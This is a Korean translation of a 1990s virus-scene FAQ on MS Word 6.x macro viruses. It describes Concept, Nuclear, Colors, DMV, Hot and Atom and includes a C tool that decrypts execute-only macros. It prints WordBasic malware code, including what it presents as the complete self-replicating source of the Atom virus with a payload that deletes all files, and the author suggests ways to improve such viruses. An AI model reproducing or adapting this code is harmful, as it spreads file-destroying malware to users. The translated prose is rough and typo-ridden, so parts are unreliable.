
 MS WORD 6.x MACRO VIRUSES FAQ V2.0 (한국어판)                CVC #02  97/09

--------------------------------------------------------------------------->

      --------------------------------------------------------------
                          
           MS WORD 6.x MACRO VIRUSES FAQ V2.0
               <FAQ= 자주 하는 질문과 대답>
                 쓴사람: AuRoDrEpH
      --------------------------------------------------------------
               "엿같은  MICRO WORD 의 도움을 받음."
      --------------------------------------------------------------

      --------------------------------------------------------------

TOPIC 1 : WORD MACRO VIRUS 란 무었인가 ?
=========================================
매크로 바이러스는 메크로<명령어 집합> 나 전형적인 파일<확장자가 .dot>
인 형태로 되어있다 또한 합법적인 MS WORD 형태 <확장자가 DOC> 로 가장한
다. DOC 형태의 파일이 감염되면 피시 사용자는 달라진 점을 찾을수가 없다
여전히 일반적이  서류형태를 지니고 있기 때문 이니다 
이 서류가 다른점은 명령어가 서류에 복사되어 있다는것입니다
서류는 데이타로 되어 있고 메크로는 실행 코드로 되어있읍니다 . 서류가 
감염되었을떼 바이러스는 실행이 되는 부분과 데이타 부분을 합칩니다. 
이것은 때때로 서류를 읽을수없게 하고 파괴합니다

메크로 바이러스는 일반적으로 메크로 파일에 감염이 됩니다 또한 자동적으
로 자신을 파일 마지막에 저장합니다 . MS WORD의 다음 부분이 열리면 
감염된 메크로가 실행이 되기때문에 다음 파일도 감염이 됩니다  


메크로 바이러스는 자신을 복사합니다.그들은 MS 윈도우나 OS/2  
MS WORD 6.X 과 7.X 과 MAC 6.0 을 사용하여 복사할경우 파일에 감염이 됩
니다
MS Word Macro 바이러스는 해석된 데이타파일에 존재하기 때문에 다른 운영
체제 하에서도 감염이 될수 있읍니다 .바이러스는 실행이 가능한 기계어 코
드를 수정하면 전염이 불가능합니다만 파일속에 있는 데이타를 MS WORD 6.0
이나 WORDBASIC , 메크로를 지원하는 다른 에디터로 수정하면 감염이 됩니다

      --------------------------------------------------------------

2 번째 장: 메크로 바이러스 연구 
=======================================

당신은 행복합니까 ,당신은 최신 메크로 바이러스를 찾았읍니다 , 현재 당
신은 그것을 배울수 있고 , 소스코드를 수정할수도 있읍니다
저는 아주 쉽게 설명 할것입니다

첫번쩨로 당신은 NORMAL.DOT 를 카피합니다 (파일은 MSOFFICE\WINWORD\MODELES)
안에 있읍니다.
대부분으 경우 메크로 바이러슨 위험하지 않읍니다. 트로이 바이러스인 
FORMATC 는 제외 됩니다. 당신이 서류를 읽을때 바이러스 벡신 프로그램을 
메모리에 상주 시켜주는것이 좋읍니다
이제 word 프로그램을 띄우고 (실습할 시간이 왔읍니다) 메뉴 tools/option
으로 가서 save 디렉토리 안에서 옵션을 선택합니다(normal.dot 를 저장합
니다)

다음 당신은 헥스에디터를 가지고 파일을 봅니다
워드 서류는 처음 부분은 데이타 (문자형식)으로 되어있는 메크로 파일이
마지막 부분에 파일이름이 들어 있읍니다
끝에서 파일이름을 찾아보세요 그리고 "u" 자를 찾아 보세요. 만약 당신이
u 자를 보았다면 그메크로는 암호화 되있다는 뜻입니다. 아직도 당신이 
좀더 많은 시간이 필요하다면 그것은 당신이 메크로 워드 파일을 카피할때
옵션으로 읽기만 가능하도록 만들었기 때문입니다: 당신은 메크로롤 실행만
할수 있고 소스 코드는 볼수가 없읍니다
만약 당신이 이름을 찾았다면 당신은 파일 안에있는 모든 메크로를 볼수가 
있읍니다
이름은 당신에게 어떻게 해야할지 가리켜 줍니다..... 하지만 주의 하세요

이제 당신은 감염된 서류를 열고 어떻게 되었나 보십시요.아무것도 못 찾겟
다구요 .....찾는 법은 간단합니다 메뉴의 tools/macro 로 가십시요 .
당신은 메크로로 된 이름을 볼수가 있읍니다(헥스 에티터로 보아도 똑같읍
니다)

만약 당신이 수정버튼을 사용하려 한다면 (.메크로가 실행만 가능하다면
topic 4 로 가서 설명서를 읽기 바랍니다)


3 번째: 바이러스 예제와 예방법
======================================================

나는 메크로 바이러스에 대해 분석을 하고 설명을 할것입니다

4.1: 바이러스 정보
====================

바이러스는 여러가지 별명을 가지고 있다
WW6Macro, WinWord.Concept, Word Basic MacroVirus (WBMV), Word Macro 9508 
<MAC>, Prank Macro <MicroSoft 에서 붙여지 이름으로 아주 심각한 상황에
서 좋지 않은 행동하기 때문이다>  메크로 바이러스가 처음으로 발견된선은
 안티 바이러스 단체에 의해서였다. 그리고 첫번째 메크로바이러스는 처음
 이라서 미국 소련 프랑스 독일 벨기에 카나다 내덜란드 터어키 핀란드 와
 다른 여러 나라로 퍼져 나갔다
 
 감염상태는 쉽게 알아 차릴수있다, 첫번째 실행하에서 바이러스는 서류를 
 감염 시킵니다 (감염된 화일 첫번쩨로 연다) 메세시상자에 숫자 1이 나타
 나고 ok 버튼이 나타납니다. 또한 간단하게 체크합니다 
 TOOLS/MACROS 옵션에서 로드된 메크로를 검사합니다 아래의 5개의 메크로
 가 나타나면 파일은 감염된것입니다

       AAAZFS *
       AAAZAO *
       AutoOpen
       PayLoad *
       FileSaveAs

 바이러스의 감염 루틴은 다음과 같읍니다;
 
    'see if we're already installed 
    For i = 1 To iMacroCount
        If MacroName$(i, 0, 0) = "PayLoad" Then
            bInstalled = - 1
        End If
        If MacroName$(i, 0, 0) = "FileSaveAs" Then
            bTooMuchTrouble = - 1
        End If
    Next i
    If Not bInstalled And Not bTooMuchTrouble Then
        'add FileSaveAs and copies of AutoOpen and FileSaveAs.
        'PayLoad is just for fun.
        iWW6IInstance = Val(GetDocumentVar$("WW6Infector"))
        sMe$ = FileName$()
        sMacro$ = sMe$ + ":Payload"
        MacroCopy sMacro$, "Global:PayLoad"
        sMacro$ = sMe$ + ":AAAZFS"
        MacroCopy sMacro$, "Global:FileSaveAs"
        sMacro$ = sMe$ + ":AAAZFS"
        MacroCopy sMacro$, "Global:AAAZFS"
        sMacro$ = sMe$ + ":AAAZAO"
        MacroCopy sMacro$, "Global:AAAZAO"

 메크로 복사본 끝에다 1과 실행만 가능한 메크로를 써넣읍니다
 
      --------------------------------------------------------------

4.2: Nuclear(바이러스 이름) :
==============

널리 알려진 Winword.Nuclear, Wordmacro-Nuclear , Wordmacro-Alert.
바이러스는 첫번째 바아러스 였다 < 서류파일과.실행형 파일 양쪽에 감염되는
바이러스 >

사실적으로 2가지 바이러스 종류가 있다 .word 환경에서 작동하는 바이러스
와 실행형 파일에 감염되는 바이러스 <시스템 파일을 지우기도 한다>
nucler 바이러스느 양쪽의 기능을 모두하는 최초의 바이러스 이다
이 바이러스는 실제적으로 파괴하는 효가는 거의 없다 .이문서에 자세히 나
와 있다 . 감염된 서류는 다음과 같이 9개의 macros를 가지고 있다

       AutoExec
       AutoOpen
       FileSaveAs
       FilePrint
       FilePrintDefault
       InsertPayload   *
       Payload         *
       DropSuriv       *
       FileExit

 GLOBAL 메크로 목록에서 얻었다

nuclear 는 찾아내기가 쉽다 .간단하게 툴스메뉴에 있는 메트로 명령하에서
볼수가 있다. 만약 메크로가 "InsertPayload","Payload", "DropSuriv" 
표시되었다면 당신은 NUCLEAR 에 감염이 되었다고 보아야 합니다
<만약 당신이 정당한 메크로를 같은 이름을 부르지 못한 다면> nuclear는 
자신을 "prompt for changes to normal.dot"옵션에 의해 찾아내지 못하게 
합니다. 변화는 일어 났지만 . 사용자는 그것을 알아 채지 못합니다

"InsertPayload" 메크로는 서류를 프린트 할때 끝에 다음과 같은 문자를 
 첨가 시킵니다. 매번 12번 프린트할때 마다 더해 집니다
  
       And finally I would like to say:
       (마지막 으로 말한다)
       STOP ALL FRENCH NUCLEAR TESTING IN THE PACIFIC!
       (프랑스는 태평양에서 핵무기 실험을 멈춰라) 
프린트 명령을 할때마다 파일끝에 위의 문장이 붙여 졋지만 중요한 것이
실제적 으로 프린트 되지 않았다. 펙스로 보내는 것은 팩스 프린터 
드라이버가 영향을 받아 금방 탄로가 났다 .실험에 있어서 , 나는 깨닫게 
되었다 어떤 팩스 기계에선 충돌이 일어나 출력을 망치게 한다

"payload" 메크로는 4월5일에 IO.SYS,MSDOS.SYS , COMMAND.COM  지울려고 
시도한다 .이것은 효과가 없다 .워드베이직은 시스템 속성의 파일은 속성을
 바꿀수가 없다.  

Nuclear 바이러스는 실행형 파일이 감염된다 DropSuriv 메크로는 시스템 
시간을 체크하여 17:00/18:00 사이에 파일 감염을 시도한다
그러나 어떤 시스템에서는 작동을 하지않는 것이다 <감염 실패는 구문 에러
가 발생한다 if 문장이 닫혀지지 않는다 이것은 페이로드가 실행되지 않게
한다>
만약 DropSuriv DID 바르게 작동했다면 기본적인 도스 유틸러티인 디버그를
찾아 냈을것이다 만약 찾았다면 메크로는 PH33r.SCR 과 EXEC_PH.BAT.를 지
워 버릴것이다 
파일을 감염자는 int 21를 가로채고  COM/EXE/NewEXE 파일끈에 자신을 복사
합니다 < 메모리는 해제되고 도스 작업은 종결된다. 바이러스 ph33r은 메모
리 상주가 가능하다> nuclear 에 감염된 메크로는 dropsuriv 메크로가 존재
합니다

다음 문자열은 실행형 감염자 에 존재합니다

       =Ph33r=
       Qark/VLAD

바이러스 단체인 vlad 는 제4호를 발간했다 <  이바이러스의 전체적이 버전
이 나와 있다 >

4.3: Colors(바이러스 이름):
=============

Colors 는 첫번째 winword 메크로 바이러스 이다 간단히 <imho>라고 
불린다.   이 바이러스는 윈도우의 칼라를 바꾼다
  If iModEvery = (iEvery - 1) Then          
        sColors$(0) = "Background"
        sColors$(1) = "AppWorkspace"
        ...
        sColors$(19) = "InactiveTitleText"
        sColors$(20) = "ButtonHilight"
        
     For i = 0 To 20
           SetProfileString("colors", sColors$(i), Str$(Int(Rnd() * 256)) + " "
           + Str$(Int(Rnd() * 256)) + " " + Str$(Int(Rnd() * 256)))
     Next i
  End If

Mac Word 는 payload < 시스템 색깔를 공격한다> 에 면역이 되있다 그러나
여전히 서류를 감염시키는 기법에는 감염되기 쉽다
서류의 감염여부를 쉽게 알수있다 감염된 서류는 서류아이콘 보다는 templa
te 아이콘이 나타난다

일반적으로 알려진 Rainbow , WordMacro.Colors, 바이러스는 1995년 10월
14일 유즈넷 유스그룹에 의해 무료로 배포 되었다
colors 바이러스는 통상적으로 norma.dot파일에 감염이 된다
감염이된 서류는 다음과 같은 메크로를 가지고 있다

       AutoOpen
       AutoClose
       AutoExec
       FileNew
       FileExit
       FileSave
       FileSaveAs
       ToolsMacro, 외 등등.

colors 안에 있는 모든 메크로는 실행만 가능하고 마이크로 소프트 워드로
볼수도 없고 편집할수도 없다.  clean 메크로는 이미 감염된 똑같은
파일이 존재 한다면  두개의 파일을 겹쳐쓴다

COLOR 의 AUTOEXEC 메크로는 EMPTY MACRO 입니다, 바이러스 없에기 단체에
서 메크로 바이러스를 없에기 위해 계회적으로 만든것입니다
"CLEANING/SCANNER" 에의해  AutoExec Macro 는 COLOR 바이러스를 지워버립
니다 

 [      OutilsOptionsEnregistrement .InviteGlobalDot = 0 ]  메우 재미
 있읍니다

COLORS 교활합니다 .AUTO 메크로를 사용하지 않아도 전염시킬수 있읍니다
아래와 같이 DISABLE AUTOMACROS 를 무력화 시킵니다

       File/New
       File/Save
       File/SaveAs
       File/Exit
       Tools/Macro

COLORS 는사용자가 위의 어떤 기능을 사용한다고 해도 dot 파일을 감염시킬
것입니다 . 그것은 또한 첫번째 윈워드 스텔스 매크로 바이러스란 이름을
얻었다 . 자신을 숨기면서 동시에 시스테을 감염시킨다
 
 [   MacroTools .Name = sNames$(i), .Print = 1, .Delete    ] Good !!!

COLORS 바이러스는 감염 주기를 가지고 있읍니다. 윈도우 에있는 win.ini
파일에 countsu 란 이름을 가지고 감염주기를 체크합니다
어찌됏는 감염된 메크로가 실행되면 카운터 수가 1 증가합니다.그것은
얼마나 많이 파일을  열고 닫고 만드느냐에 딸려 있읍니다
카운터수가 증가하여 299에 도달하고 300번째에 이르면 colors 는 활동을
계시합니다.colors 는 시스템의 칼라를 바꾸고 .다음번 윈도우를 열면 
그것을 알수가 있읍니다 

칼라는 자동실행 매크로가 없어도 실행이 가능합니다,그리고 그것은 메크로
바이러스를 만드는데 많은 도움이 되었읍니다  
 
4.4: DMV:
=========

WordMacro.DMV 는 실험 바이러스이다,워드 베이직 언어를 사용해 많들어 졌
다 .  Joel McNamera 가 1994년 가을에 메크로 바이러스의 논리를 설명하기
위해 많들었다. 이 바이러스는 자세한 설명서와 함께 베포 되었다
이바이러스는 유일하게 판매되었다 교육적인 목적으로, 후에 컨셉트 바이러
스로 발전 되엇다. dmv는 아무도 괴롭히지 않는다. 시스템에 감염될떼에는
감염 사실을 사용자에게 알린다 

아무말도 하지마세요, 그것은 아주 오래된 바이러스 입니다, 현재 모든 
기술이 공개 되어있읍니다
      --------------------------------------------------------------

4.5: HOT:
=========

다른 이름으로 WORDMACRO HOT, WinWord.Hot.이라고 합니다 
이바이러스는 14일 동안 잠복해 있다가 파일을 지웁니다
러시아 에서 처음 발견되었읍니다. 1996년 1월 에 발견 되었읍니다

감염된 서류는 4개의 실행만 가능한 메크로를 가지고 있읍니다

    AutoOpen
    DrawBringInFrOut
    InsertPBreak
    ToolsRepaginat.

메킨토시 워드 사용자는 HOT를 파일의 아이콘을 실험하여 찾아낼수 있읍니
다. 감염된 서류는 임시 아이콘으로 나타나고 . 일반적인 서류는 평범한
서류 아이콘으로 나타납니다

NOTE: WordMacro/Hot 는 외부함수를 사용한 첫번째 바이러스 입니다
워드 메크로는 표준 윈도우 API 호출을 방치합니다
윈도우 3.X에서 특히 잘 전염이 됩니다.멕과 워드 7 , 윈도우 95에서는 바
이러스가 전염이 안됩니다. 잘못됐다는 표시는 마이크로소프트 워드7.0에서
 표시됩니다

      Unable to load specified library
      ( 정의된 라이브러리를 로드 할수 없읍니다)

HOT 은  AutoOpen Macro 를 사용해 자동적으로 실행된다

4.7  WORDMACRO ATOM / ATOMIC
=============================

1996년 2월에 발견되었다 . 일반적으로 concept 바이러스와 거의 같은 증상
을 나타낸다

2 개의 바이러스 차이점은 다음과 같다

 -   바이러스 안에 있는 모든 메크로는 실행만가능하고.암호화 되어있다
 -   파일을 열거나 저장할때 전염된다
 -   아톰은 2가지의 파괴적인 증상을 가지고 있다

소스 코드는 다음과 같다: 
Macros: Atom

Sub MAIN
On Error Goto KillError
If Day(Now()) = 13 And Month(Now() = 12) Then
    Kill "*.*"
End If
KillError:
End Sub



Macros: AutoOpen

Sub MAIN
Dim FN$
FN$ = FileName$()
On Error Goto ErrorInfectGlobalTemplate
If (CheckInfected = 0) Then
    MacroCopy FN$ + ":FileSaveAs", "FileSaveAs", 1
    MacroCopy FN$ + ":FileOpen", "FileOpen", 1
    MacroCopy FN$ + ":AutoOpen", "AutoOpen", 1
    MacroCopy FN$ + ":Atom", "Atom", 1
    SaveTemplate            
End If
Call Atom
ErrorInfectGlobalTemplate:
End Sub

Function CheckInfected
CheckInfected = 0
If (CountMacros(0) >= 4) Then
    For I = 1 To CountMacros(0)
        If (MacroName$(I, 0) = "Atom") Then
            CheckInfected = 1
        End If                  
    Next I             
End If
End Function



Macros: FileOpen

Sub MAIN
On Error Goto InfError
Dim dlg As FileOpen
GetCurValues dlg
Dialog dlg
FileOpen dlg
MacroCopy "AutoOpen", Dlg.Name + ":AutoOpen", 1
MacroCopy "FileSaveAs", Dlg.Name + ":FileSaveAs", 1
MacroCopy "FileOpen", Dlg.Name + ":FileOpen", 1
MacroCopy "Atom", Dlg.Name + ":Atom", 1
FileSaveAs .Format = 1
InfError:
End Sub



Macros: FileSaveAs

Sub MAIN
Dim dlg As FileSaveAs
GetCurValues dlg
Dialog dlg
If (Dlg.Format = 0) Or (Dlg.Format = 1) Then
    MacroCopy "FileSaveAs", WindowName$() + ":FileSaveAs", 1
    MacroCopy "AutoOpen", WindowName$() + ":AutoOpen", 1
    MacroCopy "FileOpen", WindowName$() + ":FileOpen", 1
    MacroCopy "Atom", WindowName$() + ":Atom", 1
    Dlg.Format = 1
End If
If (Second(Now()) = 13) Then        ] easy... to block a document
    Dlg.Password = "ATOM#1"     ] a idea why not put a randomize passwd ?
End If  
FileSaveAs dlg
End Sub

      --------------------------------------------------------------


TOPIC 5: msword 암호 푸는법
============================================

 서류안에 있는 파일이름을 찾아낸다 . 이름뒤에 u 가 있다면 xor 값에
 의해 암호화 된것입니다
 이제 메크로의 시작점을 찾읍니다 . 대개 b89h, 1509h 에서 시작합니다
 시작점에서 연속적으로 A5h C6h 41h 가 있으며 그다음이 xor 값입니다

 다음은 메크로 바이러스 소스를 볼수 있게 하는  시언어 프로그램
 입니다
/*********
  (c) AURODREPH Productions 04/1996
**********/

#include "io.h"
#include "stdlib.h"
#include "stdio.h"
#include "conio.h"
#include "process.h"
#include "fcntl.h"
#include "string.h"
#include "sys\stat.h"

void main (void)
 {
    char Name[13];
    char Target[13];
    unsigned char *Buffer;
    int Handler, Handler1;
    unsigned int Offset;
    unsigned long Length = 0;
    int point, max, trouve, cledec, debmac, decfin;
    int stop,nbr,positcle,nbrmac,i;

    clrscr();
    printf (" ******************************************************************\n");
    printf (" *                                                                *\n");
    printf (" *               DECRYPT WORD 6.0 MACROS saved                    *\n");
    printf (" *                 with the option Execute-only                   *\n");
    printf (" *                                                                *\n");
    printf (" *                                                                *\n");
    printf (" *       --- ,This file works only with files < 32 Ko. ----       *\n");
    printf (" *     <*****}===============-                                    *\n");
    printf (" *      (z)  ' AURODREPH Productions 04/1996                      *\n");
    printf (" *                                                     ver 0.666B *\n");
    printf (" ******************************************************************\n");
    printf ("\n"); printf("\n");
    printf ("Name of the input file     = ");
    scanf ("%12s",Name);
    printf ("\n");
    printf ("Name of the output file    = ");
    scanf ("%12s",Target);
    printf("\n");
    printf ("Number of crypted macros   = ");
    scanf ("%d",&nbrmac);
    printf("\n");
    if (nbrmac > 50 ) {exit (0);}
    Handler = open (Name, O_BINARY | O_RDONLY , S_IREAD);
    if (Handler == -1)
        {printf ("The input file doesn't exist.\n"); exit(0);}

    Length = (unsigned long) lseek(Handler, 0, SEEK_END);
    lseek (Handler,0,SEEK_SET);
    Buffer = (unsigned char *) malloc((unsigned) Length);
    if (Buffer == NULL) printf ("Fail memory allocation.\n");
    if (read(Handler, Buffer, (unsigned) Length) != Length)
        {printf ("The size of the file is > 32 ko)\n");
         printf ("Try to remove some macros with WORD....\n");
         exit (0);}

    point = 0;
    max = strlen(Name);
    trouve = 1;
    cledec = 0x00;
    debmac = 0x00;
    stop = 0;
    for (i=0; i<max;i++)
        {if ((Name[i]>= 0x61) & (Name[i]<= 0x7A))
             { Name[i] = Name[i] & 0xDF ;}
        };

    for (Offset = 0x0000; Offset < Length; Offset++)
     {
      if ((Buffer[Offset] == Name[point]) && (stop !=1))
            {
            for (point = 1; point <= (max-1); point++)
                 {if (Buffer [Offset+point] == Name[point])
                            { trouve = trouve+1; }                                                  }
                            else trouve = 1;
                 };
            }
      if (trouve == max) {stop = 1;}
      if ((trouve == max) && (Buffer[Offset] == 0x55))
            {cledec = Buffer[Offset+1];
            trouve = 0;
            Buffer [Offset+1] = 0x00;
            positcle = Offset;
            }
      point = 0;
     };
if (cledec == 0x00)
    {printf (" Don't find the decrypted key... \n"); exit (0);}
    else printf ("Decrypted Key for the macro n 1 = %x \n", cledec);

    for (Offset = 0x0000; Offset < Length; Offset++)
     {
      if (Buffer[Offset] == 0xA5)
      {if ((Buffer [Offset+1] == 0xC6) || (Buffer [Offset+1] == 0xC4))
          {if (Buffer [Offset+2] == 0x41)
              {if (Buffer [Offset+4] == cledec)
                    {debmac = Offset+3;
                    }
              }       }       }      };
if (debmac == 0x00)
        {for (Offset = 0x0000; Offset < Length; Offset++)
                 {
                 if (Buffer[Offset] == cledec-1)
                    {if (Buffer [Offset+1] == cledec)
                           {debmac = Offset;  }
                        }        };             }
if (debmac == 0x00) { printf (" Don't find the beginning of the macro\n");      exit(0);}


for (nbr = 1 ; nbr <= nbrmac ;nbr++)
{
if (nbr != 1)
    {
    printf ("\n");
    printf (" I decrypt the macro n %d \n", nbr);
    Offset = positcle+24;
     if (Buffer[Offset] ==  0x55)
            {cledec = Buffer [Offset+1];
            Buffer [Offset+1] = 0x00;
            positcle = Offset;
       printf ("Decrypted Key for the macro n %d = %x \n", nbr,cledec);
                }
            else
            {printf (" Don't find the decrypted key ....\n");}
    }
Offset = debmac;
point = 0;
decfin = 1;
stop = 1;
printf ( " I work ");
    do
    { if (stop == 400) {printf ("."); stop = 1 ;}
      Buffer[Offset+point] ^= cledec ; /* decryptage par XOR */

      if (Buffer [Offset+point] == 0x64)
                {Buffer [Offset+point+1] ^= cledec;
                if (Buffer [Offset+point+1] == 0x1a)
                    {Buffer [Offset+point+2] ^= cledec;
                        if (Buffer [Offset+point+2] == 0x1b)
                            {Buffer [Offset+point+3] ^= cledec;
                            if (Buffer [Offset+point+3] != 0x64)
                                 {decfin = 0;
                                 debmac = Offset+point+3;
                                 Buffer [Offset+point+3] ^= cledec;
                                 }
                            else
                                 Buffer [Offset+point+3] ^= cledec;
                            }
                        else
                            Buffer [Offset+point+2] ^= cledec;
                }
                else
                     Buffer [Offset+point+1] ^= cledec;
        }
    if ((Offset+point) == Length) {decfin = 0;}

    stop = stop + 1;
    point = point + 1;
    }
    while ( ( decfin != 0) );
printf ("\n");
printf (" End of decrypting the macro n %d \n", nbr);
};

    _fmode= O_BINARY;

    Handler1 = creat(Target, S_IFMT | S_IREAD | S_IWRITE);
    write (Handler1, Buffer,(unsigned) Length);

    close (Handler1);
    close (Handler);
    printf ("\n"); printf ("\n");
    printf (" END ... \n");
    printf ("\n");
    printf (" The decrypted file is  %s .\n", Target);
}


